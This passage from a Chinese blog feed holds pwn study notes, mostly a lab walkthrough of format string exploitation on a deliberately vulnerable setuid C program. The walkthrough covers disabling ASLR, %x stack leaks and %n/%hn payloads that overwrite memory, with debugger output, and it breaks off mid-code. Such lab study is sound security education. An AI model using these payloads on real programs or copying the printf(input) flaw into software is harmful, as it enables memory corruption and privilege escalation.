title=\"file\"></a>file</h1><p>​\t\t查看文件基本信息</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132901291.png\" alt=\"image-20230222132901291\"></p>\n<h1 id=\"ldd\"><a href=\"#ldd\" class=\"headerlink\" title=\"ldd\"></a>ldd</h1><p>打印依赖的共享库文件</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132915670.png\" alt=\"image-20230222132915670\"></p>\n<h1 id=\"nm\"><a href=\"#nm\" class=\"headerlink\" title=\"nm\"></a>nm</h1><p>打印可执行程序的符号信息</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132921275.png\" alt=\"image-20230222132921275\"></p>\n<h1 id=\"strings\"><a href=\"#strings\" class=\"headerlink\" title=\"strings\"></a>strings</h1><p>查看可打印字符串信息</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132932791.png\" alt=\"image-20230222132932791\"></p>\n<h1 id=\"objdump-1\"><a href=\"#objdump-1\" class=\"headerlink\" title=\"objdump\"></a>objdump</h1><p>打印可执行程序的信息</p>\n<p>-h 打印section头信息</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132942474.png\" alt=\"image-20230222132942474\"></p>\n<p>-d 打印可执行section汇编</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132950821.png\" alt=\"image-20230222132950821\"></p>\n<h1 id=\"readelf\"><a href=\"#readelf\" class=\"headerlink\" title=\"readelf\"></a>readelf</h1><p>查看data段</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/",
            "title": "pwn入门-5-格式化字符串漏洞",
            "date_published": "2023-01-22T04:51:43.000Z",
            "content_html": "<h2 id=\"备忘\"><a href=\"#备忘\" class=\"headerlink\" title=\"备忘\"></a>备忘</h2><p>1.看一下其他资料、书、博客、datacon的视频等</p>\n<p>2.刷题</p>\n<p>主要是对《计算机安全导论-深度实践》 里面格式化字符串一章节的学习和复现</p>\n<h1 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h1><p>printf等输出函数为什么可以接收任意数量的参数?  就是这么设计的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20230217103340659.png\" alt=\"image-20230217103340659\"></p>\n<p>va_list是什么? 如何移动?</p>\n<p>参见《计算机安全导论 深度实践》107页</p>\n<h1 id=\"漏洞程序与利用\"><a href=\"#漏洞程序与利用\" class=\"headerlink\" title=\"漏洞程序与利用\"></a>漏洞程序与利用</h1><p>漏洞程序</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fmtstr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> input[<span class=\"number\">100</span>];</span><br><span class=\"line\">\t<span class=\"type\">int</span> var = <span class=\"number\">0x11223344</span>;</span><br><span class=\"line\">  <span class=\"comment\">//输出一些后面要用到的数据</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;target address %x\\n&quot;</span>,(<span class=\"type\">unsigned</span>) &amp;var);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;data at target address:0x%x\\n&quot;</span>,var);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;please enter a string:&quot;</span>);</span><br><span class=\"line\">\tfgets(input, <span class=\"keyword\">sizeof</span>(input)<span class=\"number\">-1</span>,<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(input); <span class=\"comment\">//漏洞点在这里</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;data at target address: 0x%x\\n&quot;</span>,var);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tfmtstr();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>gcc -m32 -o vul vul.c 编译32位的</p>\n<p>去除保护需要吗?  -fno-stack-protector                gcc -m32  -fno-stack-protector -o vul vul.c  </p>\n<p>sudo chown root vul</p>\n<p>sudo chmod 4755 vul</p>\n<p>sudo sysctl -w kernel.randomize_va_space&#x3D;0 关闭地址随机化保护</p>\n<h2 id=\"认识程序栈\"><a href=\"#认识程序栈\" class=\"headerlink\" title=\"认识程序栈\"></a>认识程序栈</h2><p>了解程序在栈中的布局非常重要</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20230217104556343.png\" alt=\"image-20230217104556343\"></p>\n<h2 id=\"输出栈中的数据\"><a href=\"#输出栈中的数据\" class=\"headerlink\" title=\"输出栈中的数据\"></a>输出栈中的数据</h2><p>%x.%x.%x.%x.%x.%x.%x.%x.%x.</p>\n<p>63.f7fbd5c0.565555d9.ffffd5aa.11223344.252e7825.78252e78.2e78252e.252e7825.</p>\n<p>为什么是%x呢? 别的呢? 看基础里面的图,这个是printf的输出格式 ,</p>\n<p>这个顺序是什么顺序呢?从哪里开始呢? 为什么不是格式化字符串地址挨着变量呢?</p>\n<p>刚输入进去的时候是挨着的呀,哦吼,这是从esp下面第一个开始往下打印,<font color=\"red\">所以这里的栈桢结构和上面的图是反着的!!</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ esp <span class=\"number\">0xffffd510</span> —▸ <span class=\"number\">0xffffd52c</span> ◂— <span class=\"string\">&#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0004</span>│     <span class=\"number\">0xffffd514</span> ◂— <span class=\"number\">0x63</span> <span class=\"comment\">/* &#x27;c&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0008</span>│     <span class=\"number\">0xffffd518</span> —▸ <span class=\"number\">0xf7fbd5c0</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad2288</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">000</span>c│     <span class=\"number\">0xffffd51c</span> —▸ <span class=\"number\">0x56555579</span> (fmtstr+<span class=\"number\">12</span>) ◂— add    ebx, <span class=\"number\">0x1a57</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0010</span>│     <span class=\"number\">0xffffd520</span> —▸ <span class=\"number\">0xffffd55a</span> ◂— <span class=\"number\">0xf4000100</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0014</span>│     <span class=\"number\">0xffffd524</span> —▸ <span class=\"number\">0xf7ffc984</span> (_rtld_global_ro+<span class=\"number\">132</span>) ◂— <span class=\"number\">0x6</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0xffffd528</span> ◂— <span class=\"number\">0x11223344</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">001</span>c│     <span class=\"number\">0xffffd52c</span> ◂— <span class=\"string\">&#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\\n&#x27;</span></span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0020</span>│  <span class=\"number\">0xffffd530</span> ◂— <span class=\"string\">&#x27;x.%x.%x.%x.%x.%x.%x.%x.\\n</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>在gdb中,直接r,然后输入%x.%x.%x.%x.%x.%x.%x.%x.%x., 就直接运行结束了,没办法看到调试后的效果,这也是自己刚开始很久都不会的调试方法…这种问题应该和同学交流的,搜索引擎也不容易搜到.</p>\n<p>pwndbg&gt; r<br>Starting program: &#x2F;home&#x2F;ubuntu&#x2F;cssec&#x2F;strings&#x2F;vul<br>target address ffffd524<br>data at target address:0x11223344<br>please enter a string:%x.%x.%x.%x.%x.%x.%x.%x.%x.<br>63.f7fbd5c0.565555d9.ffffd55a.11223344.252e7825.78252e78.2e78252e.252e7825.<br>data at target address: 0x11223344<br>[Inferior 1 (process 28953) exited normally</p>\n<p>在它之后下断点就可以了吧 </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   <span class=\"number\">0x5655563d</span> &lt;fmtstr+<span class=\"number\">112</span>&gt;    lea    eax, [ebp - <span class=\"number\">0x70</span>]</span><br><span class=\"line\">   <span class=\"number\">0x56555640</span> &lt;fmtstr+<span class=\"number\">115</span>&gt;    push   eax</span><br><span class=\"line\"> ► <span class=\"number\">0x56555641</span> &lt;fmtstr+<span class=\"number\">116</span>&gt;    call   fgets@plt                    &lt;fgets@plt&gt;</span><br><span class=\"line\">        s: <span class=\"number\">0xffffd528</span> —▸ <span class=\"number\">0xf7ffc988</span> (_rtld_global_ro+<span class=\"number\">136</span>) ◂— <span class=\"number\">0x55</span> <span class=\"comment\">/* &#x27;U&#x27; */</span></span><br><span class=\"line\">        n: <span class=\"number\">0x63</span></span><br><span class=\"line\">        stream: <span class=\"number\">0xf7fbd5c0</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad2088</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"number\">0x56555646</span> &lt;fmtstr+<span class=\"number\">121</span>&gt;    add    esp, <span class=\"number\">0x10</span></span><br><span class=\"line\">   <span class=\"number\">0x56555649</span> &lt;fmtstr+<span class=\"number\">124</span>&gt;    sub    esp, <span class=\"number\">0xc</span></span><br><span class=\"line\">   <span class=\"number\">0x5655564c</span> &lt;fmtstr+<span class=\"number\">127</span>&gt;    lea    eax, [ebp - <span class=\"number\">0x7</span></span><br><span class=\"line\">                                           </span><br><span class=\"line\">                                           </span><br><span class=\"line\">可以在这后面直接下断点即可 b *<span class=\"number\">0x56555646</span>  </span><br><span class=\"line\">     </span><br><span class=\"line\">                                           </span><br><span class=\"line\">在fgets输入后得到栈的布局如下                                     </span><br><span class=\"line\">pwndbg&gt; teles</span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ esp     <span class=\"number\">0xffffd510</span> —▸ <span class=\"number\">0xffffd528</span> ◂— <span class=\"string\">&#x27;aaaabbbbccccddddeeeeffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0004</span>│         <span class=\"number\">0xffffd514</span> ◂— <span class=\"number\">0x63</span> <span class=\"comment\">/* &#x27;c&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0008</span>│         <span class=\"number\">0xffffd518</span> —▸ <span class=\"number\">0xf7fbd5c0</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad2288</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">000</span>c│         <span class=\"number\">0xffffd51c</span> —▸ <span class=\"number\">0x565555d9</span> (fmtstr+<span class=\"number\">12</span>) ◂— add    ebx, <span class=\"number\">0x19f3</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0010</span>│         <span class=\"number\">0xffffd520</span> —▸ <span class=\"number\">0xffffd55a</span> ◂— <span class=\"number\">0x9d000100</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0014</span>│         <span class=\"number\">0xffffd524</span> ◂— <span class=\"number\">0x11223344</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0018</span>│ eax ecx <span class=\"number\">0xffffd528</span> ◂— <span class=\"string\">&#x27;aaaabbbbccccddddeeeeffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">001</span>c│         <span class=\"number\">0xffffd52c</span> ◂— <span class=\"string\">&#x27;bbbbccccddddeeeeffff\\n&#x27;</span></span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0020</span>│  <span class=\"number\">0xffffd530</span> ◂— <span class=\"string\">&#x27;ccccddddeeeeffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">09</span>:<span class=\"number\">0024</span>│  <span class=\"number\">0xffffd534</span> ◂— <span class=\"string\">&#x27;ddddeeeeffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0</span>a:<span class=\"number\">0028</span>│  <span class=\"number\">0xffffd538</span> ◂— <span class=\"string\">&#x27;eeeeffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0b</span>:<span class=\"number\">002</span>c│  <span class=\"number\">0xffffd53c</span> ◂— <span class=\"string\">&#x27;ffff\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0</span>c:<span class=\"number\">0030</span>│  <span class=\"number\">0xffffd540</span> ◂— <span class=\"number\">0xa</span> <span class=\"comment\">/* &#x27;\\n&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">0</span>d:<span class=\"number\">0034</span>│  <span class=\"number\">0xffffd544</span> ◂— <span class=\"number\">0x2c307d</span> <span class=\"comment\">/* &#x27;&#125;0,&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">0</span>e:<span class=\"number\">0038</span>│  <span class=\"number\">0xffffd548</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\">                                        </span><br></pre></td></tr></table></figure>\n\n\n\n<p>或者直接si进去查看就好了,关键是怎么在pwntools中进行关联</p>\n<h4 id=\"这个顺序是什么顺序呢-从哪里开始呢\"><a href=\"#这个顺序是什么顺序呢-从哪里开始呢\" class=\"headerlink\" title=\"这个顺序是什么顺序呢?从哪里开始呢?\"></a>这个顺序是什么顺序呢?从哪里开始呢?</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; ni</span><br><span class=\"line\"><span class=\"number\">63.f</span>7fbd5c0<span class=\"number\">.565555</span>d9.ffffd55a<span class=\"number\">.11223344</span><span class=\"number\">.252e7825</span><span class=\"number\">.78252e78</span><span class=\"number\">.2e78252</span>e<span class=\"number\">.252e7825</span>.</span><br><span class=\"line\"><span class=\"number\">0x56555655</span> in <span class=\"title function_\">fmtstr</span> <span class=\"params\">()</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">00:0000│ esp 0xffffd510 —▸ 0xffffd528 ◂— &#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\\n&#x27;</span><br><span class=\"line\">01:0004│     0xffffd514 ◂— 0x63 <span class=\"comment\">/* &#x27;c&#x27; */</span></span><br><span class=\"line\">02:0008│     0xffffd518 —▸ 0<span class=\"title function_\">xf7fbd5c0</span> <span class=\"params\">(_IO_2_1_stdin_)</span> ◂— 0xfbad2288</span><br><span class=\"line\">03:000c│     0xffffd51c —▸ 0<span class=\"title function_\">x565555d9</span> <span class=\"params\">(fmtstr+<span class=\"number\">12</span>)</span> ◂— add    ebx, 0x19f3</span><br><span class=\"line\">04:0010│     0xffffd520 —▸ 0xffffd55a ◂— 0x60000100</span><br><span class=\"line\">05:0014│     0xffffd524 ◂— 0x11223344</span><br><span class=\"line\">06:0018│     0xffffd528 ◂— &#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\\n&#x27;</span><br><span class=\"line\">07:001c│     0xffffd52c ◂— &#x27;x.%x.%x.%x.%x.%x.%x.%x.\\n</span><br><span class=\"line\">  </span><br><span class=\"line\">能看到通过%x输出的是从esp的下一个开始,往ebp方向输出</span><br><span class=\"line\">  252e7825 应该是%x.的ascii之类的?????????????/</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"修改内存中的数据\"><a href=\"#修改内存中的数据\" class=\"headerlink\" title=\"修改内存中的数据\"></a>修改内存中的数据</h2><p>​\t\t一开始会觉得很奇怪,printf不是输出东西的吗, 为什么可以修改数据,这就涉及到一些奇奇怪怪的用法了,printf中有一个%n,会把目前已打印出的字符的个数写入内存,数据在内存中保存的本质就是数字,所以这样就可以修改了</p>\n<p>​\t\t</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target address ffffe43c</span><br><span class=\"line\">data at target address:<span class=\"number\">0x11223344</span></span><br><span class=\"line\">Segmentation <span class=\"title function_\">fault</span> <span class=\"params\">(core dumped)</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t为什么会一直报这个错呢???</p>\n<p>​\t64位和32位可以分别调试一下</p>\n<p>x&#x2F;wx 0xffffe3ec<br>0xffffe3ec:\tCannot access memory at address 0xffffe3ec  </p>\n<p>???</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► <span class=\"number\">0x565555ff</span> &lt;fmtstr+<span class=\"number\">50</span>&gt;    call   <span class=\"built_in\">printf</span>@plt                    &lt;<span class=\"built_in\">printf</span>@plt&gt;</span><br><span class=\"line\">       format: <span class=\"number\">0x56555760</span> ◂— <span class=\"string\">&#x27;target address %x\\n&#x27;</span></span><br><span class=\"line\">       vararg: <span class=\"number\">0xffffd524</span> ◂— <span class=\"number\">0x11223344</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>pwndbg&gt; x&#x2F;wx 0xffffd524<br>0xffffd524:\t0x11223344</p>\n<p>32位可以访问了…</p>\n<p>64位的为什么会崩溃呢? 写入数据的时候 Segmentation fault (core dumped)</p>\n<p>因为不能访问这个地址,为什么不能访问呢? 感觉这个地址有问题,果然,是前面少了东西! 为啥少呢? 和源代码里面的%x有关系吗,gdb也没提示这个呀….</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2</span>wx <span class=\"number\">0x7fffffffe3e8</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe3e8</span>:\t<span class=\"number\">0xf7ffe710</span>\t<span class=\"number\">0x11223344</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2</span>wx <span class=\"number\">0xffffe3ec</span></span><br><span class=\"line\"><span class=\"number\">0xffffe3ec</span>:\tCannot access memory at address <span class=\"number\">0xffffe3ec</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2</span>wx <span class=\"number\">0x7fffffffe3ec</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe3ec</span>:\t<span class=\"number\">0x11223344</span>\t<span class=\"number\">0x00000000</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>先用试错法,不加%n找到要修改的地址的位置距离va_list指针有几个移动位置(每一个%x会输出一个东西,然后va_list指针移动,我们需要把它移动到存储要修改的内容的地址的地方)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings<span class=\"meta\"># echo $(printf <span class=\"string\">&quot;\\x64\\xd4\\xff\\xff&quot;</span>).%x.%x.%x.%x.%x.%x &gt; input</span></span><br><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &lt; input</span><br><span class=\"line\">target address ffffd464</span><br><span class=\"line\">data at target address:<span class=\"number\">0x11223344</span></span><br><span class=\"line\">please enter a <span class=\"built_in\">string</span>:d<span class=\"number\">.63</span>.f7fbd5c0<span class=\"number\">.565555</span>d9.ffffd49a<span class=\"number\">.11223344</span>.ffffd464</span><br><span class=\"line\">data at target address: <span class=\"number\">0x11223344</span></span><br></pre></td></tr></table></figure>\n\n<p>需要移动五个位置才能到ffffd464,5个%x,然后%n把前面的数据写入到这个地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings<span class=\"meta\"># echo $(printf <span class=\"string\">&quot;\\x74\\xd5\\xff\\xff&quot;</span>).%x.%x.%x.%x.%x.%n &gt; input</span></span><br><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &lt; input</span><br><span class=\"line\">target address ffffd574</span><br><span class=\"line\">data at target address:<span class=\"number\">0x11223344</span></span><br><span class=\"line\">please enter a <span class=\"built_in\">string</span>:t���<span class=\"number\">.63</span>.f7fbd5c0<span class=\"number\">.565555</span>d9.ffffd5aa<span class=\"number\">.11223344</span>.</span><br><span class=\"line\">data at target address: <span class=\"number\">0x2c</span></span><br></pre></td></tr></table></figure>\n\n<p>0x2c 也就是 32 + 12 &#x3D; 44</p>\n<p>44怎么来的呢,遇到%n之前输出了44个字符,5 * 8 &#x3D; 40,这是第 1 3456个输出, 第二个输出是63 也就是两位,</p>\n<p>4 + 2 + 4*8 + 6 &#x3D; 44</p>\n<p>4(\\x64\\xd4\\xff\\xff) + 2(63) + 4 *8  + 6(点) &#x3D; 44 ,就是这一串:t���.63.f7fbd5c0.565555d9.ffffd5aa.11223344.</p>\n<h2 id=\"修改内存中数据为指定值\"><a href=\"#修改内存中数据为指定值\" class=\"headerlink\" title=\"修改内存中数据为指定值\"></a>修改内存中数据为指定值</h2><h3 id=\"修饰符\"><a href=\"#修饰符\" class=\"headerlink\" title=\"修饰符\"></a>修饰符</h3><p>​\t\t这里涉及到指定值的大小问题,如果很大的值肯定不能一直堆字符,用精度或者宽度修饰符来解决</p>\n<p>​\t\techo $(printf “\\x64\\xd4\\xff\\xff”).%.8x.%x.%x.%x.%.10000000x.%n &gt; input</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings<span class=\"meta\"># echo $(printf <span class=\"string\">&quot;\\x64\\xd4\\xff\\xff&quot;</span>).%.8x.%x.%x.%x.%x.%n &gt; input</span></span><br><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/cssec/strings# ./vul32 &lt; input</span><br><span class=\"line\">target address ffffd464</span><br><span class=\"line\">data at target address:<span class=\"number\">0x11223344</span></span><br><span class=\"line\">please enter a <span class=\"built_in\">string</span>:d<span class=\"number\">.00000063</span>.f7fbd5c0<span class=\"number\">.565555</span>d9.ffffd49a<span class=\"number\">.11223344</span>.</span><br><span class=\"line\">data at target address: <span class=\"number\">0x32</span></span><br></pre></td></tr></table></figure>\n\n<p>精度修饰符:</p>\n<p>宽度修饰符:</p>\n<p><font color=\"red\">但是这样做也有问题,需要打印很多字符,耗时耗资源</font>&gt;</p>\n<h3 id=\"更快的办法\"><a href=\"#更快的办法\" class=\"headerlink\" title=\"更快的办法\"></a>更快的办法</h3><p>​\t\t格式规定符的长度修饰符</p>\n<p>​\t\t%n:视参数为4字节整型数</p>\n<p>​\t\t%hn:视参数为2字节短整型数</p>\n<p>​\t\t%hhn:视参数为1字节字符型数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2b</span>x <span class=\"number\">0xffffd416</span></span><br><span class=\"line\"><span class=\"number\">0xffffd416</span>:     <span class=\"number\">0x22</span>    <span class=\"number\">0x11</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2b</span>x <span class=\"number\">0xffffd414</span></span><br><span class=\"line\"><span class=\"number\">0xffffd414</span>:     <span class=\"number\">0x44</span>    <span class=\"number\">0x33</span></span><br></pre></td></tr></table></figure>\n\n<p>echo $(printf “\\x66\\xd4\\xff\\xff@@@@\\x64\\xd4\\xff\\xff”)%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn &gt; input</p>\n<p>data at target address: 0x6688779</p>\n<h1 id=\"利用格式化字符串漏洞注入恶意代码\"><a href=\"#利用格式化字符串漏洞注入恶意代码\" class=\"headerlink\" title=\"利用格式化字符串漏洞注入恶意代码\"></a>利用格式化字符串漏洞注入恶意代码</h1><p>漏洞源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 